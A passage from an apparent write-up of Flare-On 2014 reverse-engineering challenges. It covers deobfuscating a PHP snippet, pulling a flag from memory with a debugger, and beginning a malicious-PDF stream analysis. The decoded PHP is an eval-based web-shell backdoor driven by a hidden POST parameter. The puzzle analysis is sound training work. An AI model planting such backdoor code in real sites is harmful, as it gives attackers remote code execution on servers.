</span></span><span style=display:flex><span>    do_me <span style=color:#719e07>+=</span> terms[order[i]]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#b58900>print</span> do_me</span></span></code></pre></td></tr></table></div></div></div></figure><p>Produces the following PHP code:<figure class=code><figcaption><span>PHP code</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#268bd2>$_</span><span style=color:#719e07>=</span> <span style=color:#2aa198>&#39;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#268bd2>$__</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#268bd2>$___</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#34;</span><span style=color:#cb4b16>\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65</span><span style=color:#2aa198>&#34;</span>; <span style=color:#586e75>// base64_decode
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#719e07>eval</span>(<span style=color:#268bd2>$___</span>(<span style=color:#268bd2>$__</span>));</span></span></code></pre></td></tr></table></div></div></div></figure></p><p>Contents of <code>$_</code> and <code>$__</code> are clearly encoded in <code>base64</code> and <code>$___</code> is <code>base64_decode</code>. Base64 can be decoded in Python by calling <code>base64.b64decode</code>.
Line #4 can be re-written as</p><figure class=code><figcaption><span>Line 4</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#719e07>eval</span>(base64_decode(<span style=color:#2aa198>&#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#39;</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>// result
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span><span style=color:#268bd2>$code</span><span style=color:#719e07>=</span>base64_decode(<span style=color:#268bd2>$_</span>);    <span style=color:#719e07>eval</span>(<span style=color:#268bd2>$code</span>);</span></span></code></pre></td></tr></table></div></div></div></figure><p>So it must decode the first base64 blob and eval it. Let's decode it:</p><figure class=code><figcaption><span>Decoded line 4</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#719e07>if</span>(isset(<span style=color:#268bd2>$_POST</span>[<span style=color:#2aa198>&#34;\97</span><span style=color:#cb4b16>\4</span><span style=color:#2aa198>9</span><span style=color:#cb4b16>\4</span><span style=color:#2aa198>9</span><span style=color:#cb4b16>\6</span><span style=color:#2aa198>8</span><span style=color:#cb4b16>\x4F</span><span style=color:#2aa198>\84</span><span style=color:#cb4b16>\116\x68</span><span style=color:#2aa198>\97</span><span style=color:#cb4b16>\x74\x44\x4F\x54\x6A</span><span style=color:#2aa198>\97</span><span style=color:#cb4b16>\x76\x61\x35\x63\x72</span><span style=color:#2aa198>\97</span><span style=color:#cb4b16>\x70\x41</span><span style=color:#2aa198>\84</span><span style=color:#cb4b16>\x66\x6C</span><span style=color:#2aa198>\97</span><span style=color:#cb4b16>\x72\x65\x44\65\x53\72\111\110\6</span><span style=color:#2aa198>8</span><span style=color:#cb4b16>\7</span><span style=color:#2aa198>9\84\99</span><span style=color:#cb4b16>\x6F\x6D</span><span style=color:#2aa198>&#34;</span>]))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span><span style=color:#719e07>eval</span>(base64_decode(<span style=color:#268bd2>$_POST</span>[<span style=color:#2aa198>&#34;\97</span><span style=color:#cb4b16>\4</span><span style=color:#2aa198>9</span><span style=color:#cb4b16>\x31\6</span><span style=color:#2aa198>8</span><span style=color:#cb4b16>\x4F\x54\116\104\x61\116\x44\7</span><span style=color:#2aa198>9</span><span style=color:#cb4b16>\x54\106</span><span style=color:#2aa198>\97</span><span style=color:#cb4b16>\11</span><span style=color:#2aa198>8\97</span><span style=color:#cb4b16>\53\x63\114\x61\x70\65</span><span style=color:#2aa198>\84</span><span style=color:#cb4b16>\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F</span><span style=color:#2aa198>\84\99</span><span style=color:#cb4b16>\x6F\x6D</span><span style=color:#2aa198>&#34;</span>]));
</span></span><span style=display:flex><span>}</span></span></code></pre></td></tr></table></div></div></div></figure><p>This looks like a POST request. The characters look like a mix of ASCII and Hex values. Let's print them using Python and hope this is the last encoding:</p><figure class=code><figcaption><span>Decoder code in Python</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>mylist<span style=color:#719e07>=</span> [<span style=color:#2aa198>97</span>,<span style=color:#2aa198>49</span>,<span style=color:#2aa198>49</span>,<span style=color:#2aa198>68</span>,<span style=color:#2aa198>0x4F</span>,<span style=color:#2aa198>84</span>,<span style=color:#2aa198>116</span>,<span style=color:#2aa198>0x68</span>,<span style=color:#2aa198>97</span>,<span style=color:#2aa198>0x74</span>,<span style=color:#2aa198>0x44</span>,<span style=color:#2aa198>0x4F</span>,<span style=color:#2aa198>0x54</span>,<span style=color:#2aa198>0x6A</span>,<span style=color:#2aa198>97</span>,<span style=color:#2aa198>0x76</span>,<span style=color:#2aa198>0x61</span>,<span style=color:#2aa198>0x35</span>,<span style=color:#2aa198>0x63</span>,<span style=color:#2aa198>0x72</span>,<span style=color:#2aa198>97</span>,<span style=color:#2aa198>0x70</span>,<span style=color:#2aa198>0x41</span>,<span style=color:#2aa198>84</span>,<span style=color:#2aa198>0x66</span>,<span style=color:#2aa198>0x6C</span>,<span style=color:#2aa198>97</span>,<span style=color:#2aa198>0x72</span>,<span style=color:#2aa198>0x65</span>,<span style=color:#2aa198>0x44</span>,<span style=color:#2aa198>65</span>,<span style=color:#2aa198>0x53</span>,<span style=color:#2aa198>72</span>,<span style=color:#2aa198>111</span>,<span style=color:#2aa198>110</span>,<span style=color:#2aa198>68</span>,<span style=color:#2aa198>79</span>,<span style=color:#2aa198>84</span>,<span style=color:#2aa198>99</span>,<span style=color:#2aa198>0x6F</span>,<span style=color:#2aa198>0x6D</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#b58900>print</span> <span style=color:#2aa198>&#39;&#39;</span><span style=color:#719e07>.</span>join( <span style=color:#b58900>chr</span>(item) <span style=color:#719e07>for</span> item <span style=color:#719e07>in</span> mylist)</span></span></code></pre></td></tr></table></div></div></div></figure><p>Fortunately, we are done.</p><h4 id=level-2-flag-a11dotthatdotjava5crapatflaredashondotcom-or>Level 2 flag: a11DOTthatDOTjava5crapATflareDASHonDOTcom or <a href=mailto:a11.that.java5crap@flare-on.com>a11.that.java5crap@flare-on.com</a>
<a class=header-link href=#level-2-flag-a11dotthatdotjava5crapatflaredashondotcom-or><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><hr><h2 id=challenge-3---cheating-my-way-to-the-top><a name=ch3></a>Challenge 3 - Cheating My Way to the Top
<a class=header-link href=#challenge-3---cheating-my-way-to-the-top><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><pre tabindex=0><code>Nice job, you&#39;re really knocking these out! Here&#39;s the next binary. The password to the zip archive is &#34;malware&#34; again.
Keep up the good work, and good luck!
-FLARE
</code></pre><p>Challenge 3 is a Win32 binary called <code>such_evil</code>. <code>PE-Studio</code> does not tell us much.</p><p>Running it will result in this message:</p><p><img src=/images/2014/flare/3-1.jpg alt=BrokenByte title=BrokenByte></p><p>I cheated in this challenge. I just dropped the executable in <code>Immunity Debugger</code>, ran it and looked in memory when the message box popped up and the email was there:</p><p><img src=/images/2014/flare/3-2.jpg alt="Flag in memory" title="Flag in memory"></p><h4 id=level-3-flag>Level 3 flag: <a href=mailto:such.5h311010101@flare-on.com>such.5h311010101@flare-on.com</a>
<a class=header-link href=#level-3-flag><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><hr><h2 id=challenge-4---things-are-getting-cereal><a name=ch4></a>Challenge 4 - Things are Getting Cereal
<a class=header-link href=#challenge-4---things-are-getting-cereal><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><pre tabindex=0><code>Well done! Such dedication, much work, wow.
Here&#39;s the next challenge, password is the same as last time. We&#39;ll talk more when you figure it out.
-FLARE
</code></pre><p>It's a two page PDF named <code>APT9001.pdf</code>. First page is a picture of APT1 report and second page is empty.
We can just open the PDF in a <code>HxD</code> but it won't tell us much.
There are tools that will help us parse the PDF. I used <code>pyew</code>. You can find a good tutorial for PDF analysis <a href=https://code.google.com/p/pyew/wiki/PDFAnalysis target=_blank rel="noreferrer noopener">here</a>.<br>Let's follow the tutorial:</p><figure class=code><figcaption><span>pyew output for the PDF</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">40
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>$ python pyew<span style=color:#719e07>.</span>py APT9001<span style=color:#719e07>.</span>pdf
</span></span><span style=display:flex><span>PDF File
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PDFiD <span style=color:#2aa198>0.0.11</span> APT9001<span style=color:#719e07>.</span>pdf
</span></span><span style=display:flex><span> PDF Header: <span style=color:#719e07>%</span>PDF<span style=color:#719e07>-</span><span style=color:#2aa198>1.5</span>
</span></span><span style=display:flex><span> obj                   <span style=color:#2aa198>10</span>
</span></span><span style=display:flex><span> endobj                 <span style=color:#2aa198>9</span>
</span></span><span style=display:flex><span> stream                 <span style=color:#2aa198>3</span>
</span></span><span style=display:flex><span> endstream              <span style=color:#2aa198>3</span>
</span></span><span style=display:flex><span> xref                   <span style=color:#2aa198>2</span>
</span></span><span style=display:flex><span> trailer                <span style=color:#2aa198>2</span>
</span></span><span style=display:flex><span> startxref              <span style=color:#2aa198>2</span>
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>Page                  <span style=color:#2aa198>3</span>(<span style=color:#2aa198>2</span>)
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>Encrypt               <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>ObjStm                <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>JS                    <span style=color:#2aa198>1</span>(<span style=color:#2aa198>1</span>)
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>JavaScript            <span style=color:#2aa198>1</span>(<span style=color:#2aa198>1</span>)
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>AA                    <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>OpenAction            <span style=color:#2aa198>1</span>(<span style=color:#2aa198>1</span>)
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>AcroForm              <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>JBIG2Decode           <span style=color:#2aa198>1</span>(<span style=color:#2aa198>1</span>)
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>RichMedia             <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>Launch                <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span> <span style=color:#719e07>/</span>Colors <span style=color:#719e07>&gt;</span> <span style=color:#2aa198>2</span><span style=color:#719e07>^</span><span style=color:#2aa198>24</span>         <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span> <span style=color:#719e07>%%</span>EOF                  <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span> After last <span style=color:#719e07>%%</span>EOF       <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span> Total entropy:           <span style=color:#2aa198>7.862012</span> (     <span style=color:#2aa198>21284</span> <span style=color:#b58900>bytes</span>)
</span></span><span style=display:flex><span> Entropy inside streams:  <span style=color:#2aa198>7.890539</span> (     <span style=color:#2aa198>19723</span> <span style=color:#b58900>bytes</span>)
</span></span><span style=display:flex><span> Entropy outside streams: <span style=color:#2aa198>4.745484</span> (      <span style=color:#2aa198>1561</span> <span style=color:#b58900>bytes</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># first 512 bytes of the PDF removed</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># To list the streams that are encoded and see what filters the stream is using type &#34;pdfilter&#34;:</span>
</span></span><span style=display:flex><span>[<span style=color:#2aa198>0x00000000</span>]<span style=color:#719e07>&gt;</span> pdfilter
</span></span><span style=display:flex><span>Stream <span style=color:#2aa198>1</span> uses FlateDecode
</span></span><span style=display:flex><span>Stream <span style=color:#2aa198>1</span> uses ASCIIHexDecode
</span></span><span style=display:flex><span>Stream <span style=color:#2aa198>2</span> uses FlateDecode
</span></span><span style=display:flex><span>Stream <span style=color:#2aa198>2</span> uses ASCIIHexDecode
</span></span><span style=display:flex><span>Stream <span style=color:#2aa198>2</span> uses JBIG2Decode
</span></span><span style=display:flex><span>Stream <span style=color:#2aa198>3</span> uses FlateDecode</span></span></code></pre></td></tr></table></div></div></div></figure><p>Seems like streams 1,2 and 3 are interesting. According to the tutorial <code>pdfvi</code> displays them.</p><ul><li>FlateDecode: Decompress. In Python do <code>zlib.decompress</code></li><li>ASCIIHexDecode: Decode from ASCII Hex</li><li>JBIG2Decode: Decode as a black and white image</li></ul><p>What really threw me off was the <code>JBIG2Decode</code> decoder for stream 2. There was a <a href=http://vrt-blog.snort.org/2009/02/have-nice-weekend-pdf-love.html target=_blank rel="noreferrer noopener">vulnerability</a> associated with it. It is too short to be the email (14 bytes). It is not compressed (lacks the magic headers). <code>Pyew</code> also displays the disassembly but it is not shellcode either (if it is, then I didn't recognize it). It is also not an image (hence the <code>JBIG2Decode</code> filter).</p><figure class=code><figcaption><span>Stream 2</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#268bd2>Applying</span> <span style=color:#268bd2>Filter</span> <span style=color:#268bd2>FlateDecode</span> <span style=color:#268bd2>...</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>Applying</span> <span style=color:#268bd2>Filter</span> <span style=color:#268bd2>ASCIIHexDecode</span> <span style=color:#268bd2>...</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>Applying</span> <span style=color:#268bd2>Filter</span> <span style=color:#268bd2>JBIG2Decode</span> <span style=color:#268bd2>...</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>Encoded</span> <span style=color:#268bd2>Stream</span> <span style=color:#2aa198>2</span>
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------
</span></span><span style=display:flex><span>0000   00 20 50 <span style=color:#268bd2>FF</span> <span style=color:#2aa198>40</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>69</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>05</span> <span style=color:#2aa198>69</span> <span style=color:#2aa198>50</span> <span style=color:#2aa198>50</span>          <span style=color:#268bd2>.</span> <span style=color:#268bd2>P.@..i...iPP</span>
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#268bd2>Show</span> <span style=color:#b58900>di</span><span style=color:#268bd2>sassembly</span> (<span style=color:#268bd2>y</span><span style=color:#719e07>/</span><span style=color:#268bd2>n</span>)<span style=color:#268bd2>?</span> [<span style=color:#268bd2>n</span>]: <span style=color:#268bd2>y</span>
